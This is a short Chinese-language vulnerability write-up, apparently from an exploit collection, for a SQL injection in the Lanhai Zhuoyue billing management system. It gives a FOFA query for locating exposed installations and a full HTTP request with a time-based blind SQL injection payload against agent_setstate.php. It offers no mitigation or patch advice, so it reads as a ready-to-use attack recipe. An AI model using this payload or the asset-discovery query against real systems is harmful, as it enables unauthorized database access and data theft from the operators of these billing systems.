# 蓝海卓越计费管理系统agent_setstat存在SQL注入漏洞

# 一、漏洞简介
蓝海卓越计费管理系统agent_setstat存在SQL注入漏洞

# 二、影响版本
+ 蓝海卓越 计费管理系统

# 三、资产测绘
+ fofa`title=="蓝海卓越计费管理系统"`
+ 特征

![1716136162798-aa34ed6f-ea20-43f2-99a7-dba6a1e626c9.png](./img/ILj6pxbgPBiUNxBM/1716136162798-aa34ed6f-ea20-43f2-99a7-dba6a1e626c9-994839.png)

# 四、漏洞复现
```plain
GET /agent_setstate.php?id=1+AND+(SELECT+4964+FROM+(SELECT(if(length(database())=6,sleep(3),1)))uQqn) HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0
Content-Length: 161
```

![1716367639326-aee08e08-c3d0-4b5d-ac2d-e77844bafdce.png](./img/ILj6pxbgPBiUNxBM/1716367639326-aee08e08-c3d0-4b5d-ac2d-e77844bafdce-351977.png)





> 更新: 2024-05-23 12:33:24  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/lgkwcrdalag9xge0>